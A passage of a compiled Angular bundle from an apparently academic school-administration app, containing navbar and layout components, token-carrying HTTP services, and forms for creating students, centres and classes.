    dependencies: [NgForOf, RouterLink],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let SidebarComponent2 = _SidebarComponent;
  return SidebarComponent2;
})();

// src/app/commons/navbar/navbar.component.ts
var NavbarComponent = /* @__PURE__ */ (() => {
  const _NavbarComponent = class _NavbarComponent {
  };
  _NavbarComponent.\u0275fac = function NavbarComponent_Factory(t) {
    return new (t || _NavbarComponent)();
  };
  _NavbarComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _NavbarComponent,
    selectors: [["app-navbar"]],
    decls: 27,
    vars: 0,
    consts: [[1, "app-header"], [1, "navbar", "navbar-expand-lg", "navbar-light"], [1, "navbar-nav"], [1, "nav-item", "d-block", "d-xl-none"], ["id", "headerCollapse", "href", "javascript:void(0)", 1, "nav-link", "sidebartoggler", "nav-icon-hover"], [1, "ti", "ti-menu-2"], ["id", "navbarNav", 1, "navbar-collapse", "justify-content-end", "px-0"], [1, "navbar-nav", "flex-row", "ms-auto", "align-items-center", "justify-content-end"], [1, "nav-item", "dropdown"], ["href", "javascript:void(0)", "id", "drop2", "data-bs-toggle", "dropdown", "aria-expanded", "false", 1, "nav-link", "nav-icon-hover"], ["src", "../assets/images/profile/user-1.jpg", "alt", "", "width", "35", "height", "35", 1, "rounded-circle"], ["aria-labelledby", "drop2", 1, "dropdown-menu", "dropdown-menu-end", "dropdown-menu-animate-up"], [1, "message-body"], ["href", "javascript:void(0)", 1, "d-flex", "align-items-center", "gap-2", "dropdown-item"], [1, "ti", "ti-user", "fs-6"], [1, "mb-0", "fs-3"], [1, "ti", "ti-mail", "fs-6"], [1, "ti", "ti-list-check", "fs-6"], ["href", "./authentication-login.html", 1, "btn", "btn-outline-primary", "mx-3", "mt-2", "d-block"]],
    template: function NavbarComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "header", 0)(1, "nav", 1)(2, "ul", 2)(3, "li", 3)(4, "a", 4);
        \u0275\u0275element(5, "i", 5);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(6, "div", 6)(7, "ul", 7)(8, "li", 8)(9, "a", 9);
        \u0275\u0275element(10, "img", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "div", 11)(12, "div", 12)(13, "a", 13);
        \u0275\u0275element(14, "i", 14);
        \u0275\u0275elementStart(15, "p", 15);
        \u0275\u0275text(16, "My Profile");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(17, "a", 13);
        \u0275\u0275element(18, "i", 16);
        \u0275\u0275elementStart(19, "p", 15);
        \u0275\u0275text(20, "My Account");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(21, "a", 13);
        \u0275\u0275element(22, "i", 17);
        \u0275\u0275elementStart(23, "p", 15);
        \u0275\u0275text(24, "My Task");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(25, "a", 18);
        \u0275\u0275text(26, "Logout");
        \u0275\u0275elementEnd()()()()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let NavbarComponent2 = _NavbarComponent;
  return NavbarComponent2;
})();

// src/app/layouts/admin-layout/admin-layout.component.ts
var AdminLayoutComponent = /* @__PURE__ */ (() => {
  const _AdminLayoutComponent = class _AdminLayoutComponent {
  };
  _AdminLayoutComponent.\u0275fac = function AdminLayoutComponent_Factory(t) {
    return new (t || _AdminLayoutComponent)();
  };
  _AdminLayoutComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AdminLayoutComponent,
    selectors: [["app-admin-layout"]],
    decls: 6,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper"]],
    template: function AdminLayoutComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div");
        \u0275\u0275element(2, "app-sidebar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(3, "div", 1);
        \u0275\u0275element(4, "app-navbar")(5, "router-outlet");
        \u0275\u0275elementEnd()();
      }
    },
    dependencies: [RouterOutlet, SidebarComponent, NavbarComponent],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let AdminLayoutComponent2 = _AdminLayoutComponent;
  return AdminLayoutComponent2;
})();

// src/app/pages/admin/crear-alumnos/crear-alumnos.component.ts
var import_sweetalert23 = __toESM(require_sweetalert2_all());

// src/app/services/alumnos.service.ts
var AlumnoService = /* @__PURE__ */ (() => {
  const _AlumnoService = class _AlumnoService {
    constructor(http) {
      this.http = http;
      this.basePath = `${environment.base_url}/alumnos/`;
    }
    // Opciones Http
    getHeader() {
      this.httpOptions = {
        headers: this.addToken()
      };
    }
    getToken() {
      let token;
      if (typeof localStorage !== "undefined") {
        token = localStorage.getItem("token");
      }
      return token;
    }
    addToken() {
      const token = this.getToken();
      return new HttpHeaders({
        "Content-Type": "application/json",
        "x-token": `${token}`
      });
    }
    //LLAMADAS API  
    getAlumnos() {
      this.getHeader();
      return this.http.get(this.basePath, this.httpOptions);
    }
    deleteAlumno(id) {
      this.getHeader();
      return this.http.delete(this.basePath + id, this.httpOptions);
    }
    postAlumno(formData) {
      this.getHeader();
      return this.http.post(this.basePath, formData, this.httpOptions);
    }
    putAlumno(formData) {
      this.getHeader();
      return this.http.put(this.basePath + formData.ID_Alumno, formData, this.httpOptions);
    }
  };
  _AlumnoService.\u0275fac = function AlumnoService_Factory(t) {
    return new (t || _AlumnoService)(\u0275\u0275inject(HttpClient));
  };
  _AlumnoService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _AlumnoService,
    factory: _AlumnoService.\u0275fac,
    providedIn: "root"
  });
  let AlumnoService2 = _AlumnoService;
  return AlumnoService2;
})();

// src/app/pages/admin/crear-alumnos/crear-alumnos.component.ts
function CrearAlumnosComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 23);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearAlumnosComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 23);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearAlumnosComponent_p_26_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 23);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearAlumnosComponent_p_31_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 23);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearAlumnosComponent_p_36_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 23);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
var CrearAlumnosComponent = /* @__PURE__ */ (() => {
  const _CrearAlumnosComponent = class _CrearAlumnosComponent {
    constructor(fb, alumnoService, router) {
      this.fb = fb;
      this.alumnoService = alumnoService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Nombre: ["", [Validators.required]],
        Apellidos: ["", [Validators.required]],
        Contrase\u00F1a: ["", [Validators.required]],
        FechaNacimiento: ["", [Validators.required]],
        ID_Clase: ["", [Validators.required]]
      });
    }
    crearAlumno() {
      this.sendForm = true;
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.alumnoService.postAlumno(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-alumnos"]);
        }, (error) => {
          console.error("Error de creaci\xF3n:", error);
          import_sweetalert23.default.fire(error.error.message);
        });
      }
    }
    validarForm(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _CrearAlumnosComponent.\u0275fac = function CrearAlumnosComponent_Factory(t) {
    return new (t || _CrearAlumnosComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(AlumnoService), \u0275\u0275directiveInject(Router));
  };
  _CrearAlumnosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearAlumnosComponent,
    selectors: [["app-crear-alumnos"]],
    decls: 44,
    vars: 6,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], ["for", "Apellidos", 1, "form-label"], ["formControlName", "Apellidos", "id", "Apellidos", 1, "form-control"], ["for", "Contrase\xF1a", 1, "form-label"], ["type", "password", "formControlName", "Contrase\xF1a", "id", "Contrase\xF1a", 1, "form-control"], ["for", "FechaNacimiento", 1, "form-label"], ["formControlName", "FechaNacimiento", "id", "FechaNacimiento", 1, "form-control"], ["for", "ID_Clase", 1, "form-label"], ["formControlName", "ID_Clase", "id", "ID_Clase", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-alumnos", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "text-danger"]],
    template: function CrearAlumnosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, CrearAlumnosComponent_p_16_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(17, "div", 7)(18, "label", 11);
        \u0275\u0275text(19, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 12);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, CrearAlumnosComponent_p_21_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(22, "div", 7)(23, "label", 13);
        \u0275\u0275text(24, "Contrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "input", 14);
        \u0275\u0275elementEnd();
        \u0275\u0275template(26, CrearAlumnosComponent_p_26_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(27, "div", 7)(28, "label", 15);
        \u0275\u0275text(29, "Fecha de Nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275element(30, "input", 16);
        \u0275\u0275elementEnd();
        \u0275\u0275template(31, CrearAlumnosComponent_p_31_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(32, "div", 7)(33, "label", 17);
        \u0275\u0275text(34, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 18);
        \u0275\u0275elementEnd();
        \u0275\u0275template(36, CrearAlumnosComponent_p_36_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(37, "button", 19);
        \u0275\u0275listener("click", function CrearAlumnosComponent_Template_button_click_37_listener() {
          return ctx.crearAlumno();
        });
        \u0275\u0275text(38, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(39, "button", 20);
        \u0275\u0275text(40, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(41, "div", 21)(42, "p", 22);
        \u0275\u0275text(43, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Nombre"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Apellidos"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Contrase\xF1a"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("FechaNacimiento"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("ID_Clase"));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let CrearAlumnosComponent2 = _CrearAlumnosComponent;
  return CrearAlumnosComponent2;
})();

// src/app/pages/admin/crear-centros/crear-centros.component.ts
var import_sweetalert24 = __toESM(require_sweetalert2_all());

// src/app/services/centros.service.ts
var CentroService = /* @__PURE__ */ (() => {
  const _CentroService = class _CentroService {
    constructor(http) {
      this.http = http;
      this.basePath = `${environment.base_url}/centros/`;
    }
    // Opciones Http
    getHeader() {
      this.httpOptions = {
        headers: this.addToken()
      };
    }
    getToken() {
      let token;
      if (typeof localStorage !== "undefined") {
        token = localStorage.getItem("token");
      }
      return token;
    }
    addToken() {
      const token = this.getToken();
      return new HttpHeaders({
        "Content-Type": "application/json",
        "x-token": `${token}`
      });
    }
    //LLAMADAS API  
    getCentros() {
      this.getHeader();
      return this.http.get(this.basePath, this.httpOptions);
    }
    deleteCentro(id) {
      this.getHeader();
      return this.http.delete(this.basePath + id, this.httpOptions);
    }
    postCentro(formData) {
      return this.http.post(this.basePath, formData);
    }
    putCentro(formData) {
      this.getHeader();
      return this.http.put(this.basePath + formData.ID_Centro, formData, this.httpOptions);
    }
  };
  _CentroService.\u0275fac = function CentroService_Factory(t) {
    return new (t || _CentroService)(\u0275\u0275inject(HttpClient));
  };
  _CentroService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _CentroService,
    factory: _CentroService.\u0275fac,
    providedIn: "root"
  });
  let CentroService2 = _CentroService;
  return CentroService2;
})();

// src/app/pages/admin/crear-centros/crear-centros.component.ts
function CrearCentrosComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "El Email es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_26_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "La Contrase\xF1a es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_31_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "La Calle es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_36_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "El C\xF3digo Postal es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_41_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "La Localidad es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function CrearCentrosComponent_p_46_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 28);
    \u0275\u0275text(1, "La Provincia es obligatoria");
    \u0275\u0275elementEnd();
  }
}
var CrearCentrosComponent = /* @__PURE__ */ (() => {
  const _CrearCentrosComponent = class _CrearCentrosComponent {
    constructor(fb, centroService, router) {
      this.fb = fb;
      this.centroService = centroService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Nombre: ["", [Validators.required]],
        Email: ["", [Validators.required, Validators.email]],
        Contrase\u00F1a: ["", [Validators.required]],
        Calle: ["", [Validators.required]],
        CP: ["", [Validators.required]],
        Localidad: ["", [Validators.required]],
        Provincia: ["", [Validators.required]]
      });
    }
    crearCentro() {
      this.sendForm = true;
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.centroService.postCentro(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-centros"]);
        }, (error) => {
          console.error("Error de creaci\xF3n:", error);
          import_sweetalert24.default.fire(error.error.message);
        });
      }
    }
    validarForm(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _CrearCentrosComponent.\u0275fac = function CrearCentrosComponent_Factory(t) {
    return new (t || _CrearCentrosComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(CentroService), \u0275\u0275directiveInject(Router));
  };
  _CrearCentrosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearCentrosComponent,
    selectors: [["app-crear-centros"]],
    decls: 54,
    vars: 8,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], ["for", "Email", 1, "form-label"], ["type", "email", "formControlName", "Email", 1, "form-control"], [1, "mb-4"], ["for", "Contrase\xF1a", 1, "form-label"], ["type", "password", "formControlName", "Contrase\xF1a", "id", "Contrase\xF1a", 1, "form-control"], ["for", "Calle", 1, "form-label"], ["formControlName", "Calle", "id", "Calle", 1, "form-control"], ["for", "CP", 1, "form-label"], ["formControlName", "CP", "id", "CP", 1, "form-control"], ["for", "Localidad", 1, "form-label"], ["formControlName", "Localidad", "id", "Localidad", 1, "form-control"], ["for", "Provincia", 1, "form-label"], ["formControlName", "Provincia", "id", "Provincia", 1, "form-control", "d-inline-block"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-centros", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "text-danger"]],
    template: function CrearCentrosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, CrearCentrosComponent_p_16_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(17, "div", 7)(18, "label", 11);
        \u0275\u0275text(19, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 12);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, CrearCentrosComponent_p_21_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(22, "div", 13)(23, "label", 14);
        \u0275\u0275text(24, "Contrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "input", 15);
        \u0275\u0275elementEnd();
        \u0275\u0275template(26, CrearCentrosComponent_p_26_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(27, "div", 13)(28, "label", 16);
        \u0275\u0275text(29, "Calle");
        \u0275\u0275elementEnd();
        \u0275\u0275element(30, "input", 17);
        \u0275\u0275elementEnd();
        \u0275\u0275template(31, CrearCentrosComponent_p_31_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(32, "div", 13)(33, "label", 18);
        \u0275\u0275text(34, "C\xF3igo Postal");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 19);
        \u0275\u0275elementEnd();
        \u0275\u0275template(36, CrearCentrosComponent_p_36_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(37, "div", 13)(38, "label", 20);
        \u0275\u0275text(39, "Localidad");
        \u0275\u0275elementEnd();
        \u0275\u0275element(40, "input", 21);
        \u0275\u0275elementEnd();
        \u0275\u0275template(41, CrearCentrosComponent_p_41_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(42, "div", 13)(43, "label", 22);
        \u0275\u0275text(44, "Provincia");
        \u0275\u0275elementEnd();
        \u0275\u0275element(45, "input", 23);
        \u0275\u0275elementEnd();
        \u0275\u0275template(46, CrearCentrosComponent_p_46_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(47, "button", 24);
        \u0275\u0275listener("click", function CrearCentrosComponent_Template_button_click_47_listener() {
          return ctx.crearCentro();
        });
        \u0275\u0275text(48, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(49, "button", 25);
        \u0275\u0275text(50, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(51, "div", 26)(52, "p", 27);
        \u0275\u0275text(53, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Nombre"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Email"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Contrase\xF1a"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Calle"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("CP"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Localidad"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Provincia"));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let CrearCentrosComponent2 = _CrearCentrosComponent;
  return CrearCentrosComponent2;
})();

// src/app/pages/admin/crear-clases/crear-clases.component.ts
var import_sweetalert25 = __toESM(require_sweetalert2_all());

// src/app/services/clases.service.ts
var ClaseService = /* @__PURE__ */ (() => {
  const _ClaseService = class _ClaseService {
    constructor(http) {
      this.http = http;
      this.basePath = `${environment.base_url}/clases/`;
    }
    // Opciones Http
    getHeader() {
      this.httpOptions = {
        headers: this.addToken()
      };
    }
    getToken() {
      let token;
      if (typeof localStorage !== "undefined") {
        token = localStorage.getItem("token");
      }
      return token;
    }
    addToken() {
      const token = this.getToken();
      return new HttpHeaders({
        "Content-Type": "application/json",
        "x-token": `${token}`
      });
    }
    //LLAMADAS API  
    getClases() {
      this.getHeader();
      return this.http.get(this.basePath, this.httpOptions);
    }
    deleteClase(id) {
      this.getHeader();
      return this.http.delete(this.basePath + id, this.httpOptions);
    }
    postClase(formData) {
      this.getHeader();
      return this.http.post(this.basePath, formData, this.httpOptions);
    }
    putClase(formData) {
      this.getHeader();
      return this.http.put(this.basePath + formData.ID_Clase, formData, this.httpOptions);
    }
  };
  _ClaseService.\u0275fac = function ClaseService_Factory(t) {
    return new (t || _ClaseService)(\u0275\u0275inject(HttpClient));
  };
  _ClaseService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _ClaseService,
    factory: _ClaseService.\u0275fac,
    providedIn: "root"
  });
  let ClaseService2 = _ClaseService;
  return ClaseService2;
})();

// src/app/pages/admin/crear-clases/crear-clases.component.ts
function CrearClasesComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 19);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearClasesComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 19);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearClasesComponent_p_26_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 19);
    \u0275\u0275text(1, "El N\xFAmero de alumnos es obligatorio");
    \u0275\u0275elementEnd();
  }
}
var CrearClasesComponent = /* @__PURE__ */ (() => {
  const _CrearClasesComponent = class _CrearClasesComponent {
    constructor(fb, claseService, router) {
      this.fb = fb;
      this.claseService = claseService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Nombre: ["", [Validators.required]],
        ID_Centro: ["", [Validators.required]],
        NumAlumnos: ["", [Validators.required]]
      });
    }
    crearClase() {
      this.sendForm = true;
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.claseService.postClase(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-clases"]);
        }, (error) => {
          console.error("Error de creaci\xF3n:", error);
          import_sweetalert25.default.fire(error.error.message);
        });
      }
    }
    validarForm(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _CrearClasesComponent.\u0275fac = function CrearClasesComponent_Factory(t) {
    return new (t || _CrearClasesComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(ClaseService), \u0275\u0275directiveInject(Router));
  };
  _CrearClasesComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearClasesComponent,
    selectors: [["app-crear-clases"]],
    decls: 34,
    vars: 4,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], ["for", "ID_Centro", 1, "form-label"], ["formControlName", "ID_Centro", "id", "ID_Centro", 1, "form-control"], ["for", "NumAlumnos", 1, "form-label"], ["formControlName", "NumAlumnos", "id", "NumAlumnos", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-clases", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "text-danger"]],
    template: function CrearClasesComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, CrearClasesComponent_p_16_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(17, "div", 7)(18, "label", 11);
        \u0275\u0275text(19, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 12);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, CrearClasesComponent_p_21_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(22, "div", 7)(23, "label", 13);
        \u0275\u0275text(24, "N\xBA Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "input", 14);
        \u0275\u0275elementEnd();
        \u0275\u0275template(26, CrearClasesComponent_p_26_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(27, "button", 15);
        \u0275\u0275listener("click", function CrearClasesComponent_Template_button_click_27_listener() {
          return ctx.crearClase();
        });
        \u0275\u0275text(28, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(29, "button", 16);
        \u0275\u0275text(30, "Volver");
